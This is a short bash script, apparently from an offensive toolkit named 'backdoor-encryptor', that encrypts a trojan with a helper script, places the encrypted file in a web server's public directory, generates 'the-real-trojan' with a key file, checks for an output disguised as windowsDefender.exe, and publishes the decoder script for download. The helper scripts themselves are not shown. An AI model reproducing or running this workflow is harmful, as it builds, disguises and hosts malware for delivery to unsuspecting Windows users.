#!/bin/bash
######################################################
RED='\033[0;31m'
PU='\033[0;35m'
LG='\033[0;37m'
CY='\033[0;36m'
BL='\033[0;34m'
YEL='\033[1;33m'
BR='\033[0;33m'
LB='\033[1;34m'
LGREEN='\033[1;32m'
NC='\033[0m' # No Color
######################################################
echo "[backdoor-encryptor]"
printf "${BR}[${RED}✖${RED}‿${RED}✖${BR}]${NC} _${LGREEN}> lets encrypt some files . . .${NC}\n"
##encrypt the trojant
sudo python3 bde.py
##move the encrypted file to the server
sudo mv lego.txt /var/www/html
echo "[*] the-real-trojan-generation"
sudo python3  bdd.py lego.txt $(cat keys.txt)
echo "[*] your-file?"
ls | grep windowsDefender.exe
echo "[*] different-files?"
echo "[*] moving to public html"
sudo cp bdd.py /var/www/html/
